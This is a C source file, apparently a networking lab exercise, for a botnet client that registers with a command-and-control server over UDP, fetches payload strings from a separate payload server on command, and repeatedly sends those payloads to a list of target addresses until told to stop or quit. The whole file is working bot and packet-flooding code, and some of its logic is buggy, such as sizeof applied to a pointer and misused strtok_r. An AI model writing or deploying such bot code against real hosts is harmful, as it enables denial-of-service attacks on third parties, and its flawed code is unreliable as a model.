#include <arpa/inet.h>
#include <err.h>
#include <getopt.h>
#include <netdb.h>
#include <stdbool.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <sys/socket.h>
#include <sys/time.h>
#include <sys/types.h>
#include <unistd.h>

#include "message.h"
#include "wrappers.h"

#define REGMSG "REG\n"       /* Register to C&C with this message */
#define REQPAYLOAD "HELLO\n" /* Message to send to the payload server when requesting payload */

// -- commands from cnc --

int main(int argc, char **argv) {
    if (argc != 3) {
        errx(1, "Usage: %s ip port", argv[0]);
    }

    char *ip = argv[1];   /* CnC server IP adress or hostname */
    char *port = argv[2]; /* CnC server port number or service name */
    char payload_orig[1025] = {0};
    bool gotpayload = false;
    bool stopsending = false;
    bool quit = false;

    struct addrinfo hints = {
        .ai_family = AF_INET,
        .ai_socktype = SOCK_DGRAM,
    };
    struct addrinfo *res_cnc;
    Getaddrinfo(ip, port, &hints, &res_cnc);

    int sock = Socket(AF_INET, SOCK_DGRAM, 0);
    Sendto(sock, REGMSG, strlen(REGMSG), 0, res_cnc->ai_addr, res_cnc->ai_addrlen);

    struct sockaddr *cnc_addr = res_cnc->ai_addr;
    socklen_t len = sizeof(struct sockaddr);
    freeaddrinfo(res_cnc);

    fd_set master;
    fd_set read_fds;

    FD_SET(sock, &master);
    int fdmax = sock;

    struct timeval tv = {
        .tv_sec = 0,
        .tv_usec = 0,
    };

    char *payload_copy = malloc(1025);
    memset(payload_copy, 0, 1025);
    strcpy(payload_copy, payload_orig);
    Setsockopt(sock, SOL_SOCKET, SO_BROADCAST, &(int){1}, sizeof(int));  // enable broadcast (Među IP adresama se može nalaziti i broadcast adresa)
    while (true) {
        struct MSG msg = {0};
        int nbytes = Recvfrom(sock, &msg, sizeof(msg), 0, cnc_addr, &len);
        if (msg.command == COM_QUIT)
            break;
        else if (msg.command == COM_PROG_TCP || msg.command == COM_PROG_UDP) {
            struct sockaddr udpserv;
            hints.ai_socktype = (msg.command == COM_PROG_TCP) ? SOCK_STREAM : SOCK_DGRAM;  // recycle hints
            struct addrinfo *res_serv;
            Getaddrinfo(msg.targets[0].ip, msg.targets[0].port, &hints, &res_serv);

            int sockserv = Socket(res_serv->ai_family, res_serv->ai_socktype, res_serv->ai_protocol);

            if (msg.command == COM_PROG_TCP) {
                printf("Sending a TCP packet to %s:%s\n", msg.targets[0].ip, msg.targets[0].port);
                Connect(sockserv, res_serv->ai_addr, res_serv->ai_addrlen);
                memset(payload_orig, 0, sizeof(payload_orig));
                Send(sockserv, REQPAYLOAD, sizeof(REQPAYLOAD), 0);
                Recv(sockserv, payload_orig, sizeof(payload_orig), 0);
                gotpayload = true;
                payload_orig[strlen(payload_orig) - 1] = '\0';
                printf("Payload updated: %s\n", payload_orig);
                close(sockserv);
            } else {
                printf("Sending a UDP packet to %s:%s\n", msg.targets[0].ip, msg.targets[0].port);
                memset(payload_orig, 0, sizeof(payload_orig));
                Sendto(sockserv, REQPAYLOAD, sizeof(REQPAYLOAD), 0, res_serv->ai_addr, res_serv->ai_addrlen);
                Recvfrom(sockserv, payload_orig, sizeof(payload_orig), 0, &udpserv, &len);
                gotpayload = true;
                payload_orig[strlen(payload_orig) - 1] = '\0';
                printf("Payload updated: %s\n", payload_orig);
                close(sockserv);
            }

            freeaddrinfo(res_serv);
        } else if (msg.command == COM_RUN) {
            if (!gotpayload) continue;
            int payload_count = 1;
            for (int i = 0; i < sizeof(payload_copy); i++) {
                if (payload_copy[i] == ':') payload_count++;
            }
            int target_count = (nbytes - sizeof(msg.command)) / sizeof(struct ip_port);
            // first through the payloads, then through the targets sending each payload to each target
            int sock_target = Socket(AF_INET, SOCK_DGRAM, 0);
            char *sendingpayload;
            for (int i = 0; i < 100; i++) {
                if (stopsending || quit) break;
                strcpy(payload_copy, payload_orig);  // strtok will modify it, so we need a copy
                while ((sendingpayload = strtok_r(payload_copy, ":", &payload_copy))) {
                    if (stopsending || quit) break;
                    for (int target_index = 0; target_index < target_count; target_index++) {
                        if (stopsending || quit) break;
                        read_fds = master;
                        Select(fdmax + 1, &read_fds, NULL, NULL, &tv);
                        if (FD_ISSET(sock, &read_fds)) {
                            char msgint = 0;
                            Recvfrom(sock, &msgint, sizeof(msgint), 0, cnc_addr, &len); // when here, only stop or quit can be received
                            if (msgint == COM_STOP) {
                                printf("Stopping sending packets\n");
                                stopsending = true;
                                break;
                            } else if (msgint == COM_QUIT) {
                                printf("Quitting\n");
                                quit = true;
                                break;
                            } else {
                                printf("Got a packet on the socket, but it was not a stop or quit, ignoring\n");
                            }
                        }

                        struct addrinfo hints = {
                            .ai_family = AF_INET,
                            .ai_socktype = SOCK_DGRAM,
                        };
                        struct addrinfo *res_target;
                        Getaddrinfo(msg.targets[target_index].ip, msg.targets[target_index].port, &hints, &res_target);
                        Sendto(sock_target, sendingpayload, strlen(sendingpayload), 0, res_target->ai_addr, res_target->ai_addrlen);
                        printf("Sent payload %s to %s:%s\n", sendingpayload, msg.targets[target_index].ip, msg.targets[target_index].port);
                        freeaddrinfo(res_target);
                    }
                }
                if (quit) break;
                sleep(1);
            }
            close(sock_target);
            stopsending = false; // TODO whas this, forgor
        } else if (msg.command == COM_STOP) {
            printf("Not currently sending any packets\n");
            continue;
        } else {
            printf("Unknown command: %c\n", msg.command);
            continue;
        }
        if (quit) break;
    }
    close(sock);
    return 0;
}
